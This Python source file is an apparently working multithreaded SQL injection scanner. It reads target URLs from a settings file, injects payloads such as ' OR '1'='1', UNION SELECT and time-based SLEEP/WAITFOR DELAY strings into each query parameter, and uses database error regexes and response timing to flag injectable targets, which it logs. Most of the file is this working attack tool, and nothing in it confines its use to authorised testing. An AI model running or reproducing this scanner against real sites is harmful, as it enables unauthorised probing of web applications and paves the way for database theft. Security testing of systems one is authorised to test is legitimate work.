import re
import requests
import os
import time
import json
import threading
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, urlsplit, urlunsplit, parse_qs, urlencode
import colorama
from colorama import init, Fore, Style
from tools import useragent
from tools import colorprint
import config.setting as setting
from settings import TARGET_FILE_PATH, TARGET, TARGET_FILE_CHECK

init(autoreset=True)

# Global variables
vulnerable = []
not_vulnerable = []
scan_stats = {
    'total_tested': 0,
    'vulnerable': 0,
    'start_time': time.time(),
    'errors': 0
}
request_timeout = 20

# Directory and file paths
SCAN_RESULTS_DIR = "scan_results"
LOG_DIR = "log/sql_inj"
SCAN_RESULTS_FILE = os.path.join(SCAN_RESULTS_DIR, "tht_opsdk_sqli_scanner.txt")
LOG_FILE = os.path.join(LOG_DIR, "tht_opsdk_sqli_scanner_log.txt")

class VulnDetector:
    def __init__(self):
        self.detection_patterns = {
            'MySQL': [
                r"SQL syntax.*MySQL", 
                r"Warning.*mysql_.*", 
                r"valid MySQL result", 
                r"MySqlClient\.",
                r"com\.mysql\.jdbc\.exceptions",
                r"MySQL server version for the right syntax",
                r"check the manual that corresponds to your MySQL server version"
            ],
            'PostgreSQL': [
                r"PostgreSQL.*ERROR", 
                r"Warning.*\Wpg_.*", 
                r"valid PostgreSQL result", 
                r"Npgsql\.",
                r"org\.postgresql\.util\.PSQLException",
                r"ERROR:\s\ssyntax error at or near"
            ],
            'MicrosoftSQLServer': [
                r"Driver.* SQL[\-\_\ ]*Server", 
                r"OLE DB.* SQL Server", 
                r"(\W|\A)SQL Server.*Driver", 
                r"Warning.*mssql_.*", 
                r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", 
                r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", 
                r"(?s)Exception.*\WRoadhouse\.Cms\.",
                r"System\.Data\.SqlClient\.SqlException",
                r"Unclosed quotation mark after the character string"
            ],
            'MicrosoftAccess': [
                r"Microsoft Access Driver", 
                r"JET Database Engine", 
                r"Access Database Engine",
                r"Microsoft Office Access Database Engine",
                r"ODBC Microsoft Access Driver"
            ],
            'Oracle': [
                r"\bORA-[0-9][0-9][0-9][0-9]", 
                r"Oracle error", 
                r"Oracle.*Driver", 
                r"Warning.*\Woci_.*", 
                r"Warning.*\Wora_.*",
                r"oracle\.jdbc\.driver",
                r"SQL command not properly ended"
            ],
            'IBMDB2': [
                r"CLI Driver.*DB2", 
                r"DB2 SQL error", 
                r"\bdb2_\w+\(",
                r"DB2 SQL Error:"
            ],
            'SQLite': [
                r"SQLite/JDBCDriver", 
                r"SQLite.Exception", 
                r"System.Data.SQLite.SQLiteException", 
                r"Warning.*sqlite_.*", 
                r"Warning.*SQLite3::", 
                r"\[SQLITE_ERROR\]",
                r"SQLite3::SQLException"
            ],
            'Sybase': [
                r"(?i)Warning.*sybase.*", 
                r"Sybase message", 
                r"Sybase.*Server message.*",
                r"Sybase.*error"
            ]
        }
        
    def content_check(self, content):
        for db_type, patterns in self.detection_patterns.items():
            for pattern in patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    return True, db_type
        return False, None

def generate_payloads(param, value):
    payloads = [
        f"{param}='",
        f"{param}=' OR '1'='1",
        f"{param}=' OR '1'='1' --",
        f"{param}=1 OR 1=1",
        f"{param}=1' OR '1'='1'#",
        f"{param}='; WAITFOR DELAY '0:0:5'--",
        f"{param}=1;SELECT SLEEP(5)",
        f"{param}=1 AND 1=CONVERT(int,@@version)",
        f"{param}=1 AND 1=1 UNION SELECT 1,2,3,4,5,6--",
        f"{param}=1 AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe"
    ]
    return payloads

def test_parameter(url, param, original_value):
    parsed = urlsplit(url)
    query = parse_qs(parsed.query, keep_blank_values=True)
    
    for payload in generate_payloads(param, original_value):
        try:
            query[param] = [payload]
            new_query = urlencode(query, doseq=True)
            new_url = urlunsplit((parsed.scheme, parsed.netloc, parsed.path, new_query, parsed.fragment))
            
            start_time = time.time()
            response = requests.get(
                new_url,
                headers={'User-agent': useragent.get_useragent()},
                timeout=request_timeout,
                allow_redirects=False
            )
            response_time = time.time() - start_time
            
            vulner = VulnDetector()
            is_vulnerable, db_type = vulner.content_check(response.text)
            
            if is_vulnerable or response_time > 5:
                if response_time > 5:
                    db_type = db_type or "Time-based detection"
                return True, db_type, payload
                
        except Exception as e:
            scan_stats['errors'] += 1
            continue
            
    return False, None, None

def VulnCheck(url):
    if "=" not in url:
        not_vulnerable.append(url)
        return
        
    try:
        parsed = urlsplit(url)
        if not parsed.query:
            not_vulnerable.append(url)
            return
            
        params = parse_qs(parsed.query, keep_blank_values=True)
        
        for param in params:
            for value in params[param]:
                is_vulnerable, db_type, payload = test_parameter(url, param, value)
                if is_vulnerable:
                    result = {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'db_type': db_type,
                        'type': 'Error-based' if 'Time-based' not in db_type else 'Time-based',
                        'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
                    }
                    vulnerable.append(result)
                    colorprint.colorprint(
                        f"Vulnerable: {url}\n"
                        f"Parameter: {param}\n"
                        f"Payload: {payload}\n"
                        f"DB Type: {db_type}\n"
                        f"Type: {'Error-based' if 'Time-based' not in db_type else 'Time-based'}\n"
                        "----------------------------------------",
                        "v"
                    )
                    return
                    
        not_vulnerable.append(url)
        scan_stats['total_tested'] += 1
        
    except Exception as e:
        scan_stats['errors'] += 1
        colorprint.colorprint(f"Error testing {url}: {str(e)}", "e")

def create_directories():
    """Create required directories if they don't exist"""
    if not os.path.exists(SCAN_RESULTS_DIR):
        os.makedirs(SCAN_RESULTS_DIR)
    if not os.path.exists(LOG_DIR):
        os.makedirs(LOG_DIR)

def save_results():
    """Save results to files"""
    create_directories()
    
    # Save vulnerable results to scan_results file
    if vulnerable:
        with open(SCAN_RESULTS_FILE, "w") as f:
            for vuln in vulnerable:
                f.write(json.dumps(vuln) + "\n")
    
    # Save all logs (both vulnerable and not vulnerable)
    with open(LOG_FILE, "a") as log_file:
        log_file.write(f"\n\n=== Scan started at {time.strftime('%Y-%m-%d %H:%M:%S')} ===\n")
        
        # Write vulnerable results
        log_file.write("\nVULNERABLE TARGETS:\n")
        for vuln in vulnerable:
            log_file.write(f"URL: {vuln['url']}\n")
            log_file.write(f"Parameter: {vuln['parameter']}\n")
            log_file.write(f"Payload: {vuln['payload']}\n")
            log_file.write(f"DB Type: {vuln['db_type']}\n")
            log_file.write(f"Type: {vuln['type']}\n")
            log_file.write(f"Timestamp: {vuln['timestamp']}\n")
            log_file.write("----------------------------------------\n")
        
        # Write non-vulnerable results
        log_file.write("\nNON-VULNERABLE TARGETS:\n")
        for url in not_vulnerable:
            log_file.write(f"{url}\n")
        
        # Write scan statistics
        elapsed_time = time.time() - scan_stats['start_time']
        log_file.write("\nSCAN STATISTICS:\n")
        log_file.write(f"Total tested: {scan_stats['total_tested']}\n")
        log_file.write(f"Vulnerable found: {len(vulnerable)}\n")
        log_file.write(f"Errors encountered: {scan_stats['errors']}\n")
        log_file.write(f"Scan duration: {elapsed_time:.2f} seconds\n")

def get_targets():
    """Get targets based on settings"""
    targets = []
    
    if TARGET_FILE_CHECK.lower() == "on":
        if os.path.exists(TARGET_FILE_PATH):
            with open(TARGET_FILE_PATH, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        else:
            colorprint.colorprint(f"Target file not found: {TARGET_FILE_PATH}", "e")
            exit(1)
    else:
        if TARGET:
            targets = [TARGET]
        else:
            colorprint.colorprint("No target specified in settings.py", "e")
            exit(1)
    
    return targets

def VulnMain():
    targets = get_targets()
    if not targets:
        colorprint.colorprint("No targets to scan", "w")
        return
    
    colorprint.colorprint(f"Starting scan of {len(targets)} targets", "i")
    
    # Using ThreadPoolExecutor for better thread management
    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(VulnCheck, targets)
    
    # Save results
    save_results()
    
    # Print summary
    elapsed_time = time.time() - scan_stats['start_time']
    colorprint.colorprint(
        f"\nScan completed in {elapsed_time:.2f} seconds\n"
        f"Total tested: {scan_stats['total_tested']}\n"
        f"Vulnerable found: {len(vulnerable)}\n"
        f"Errors encountered: {scan_stats['errors']}",
        "i"
    )

if __name__ == "__main__":
    VulnMain()
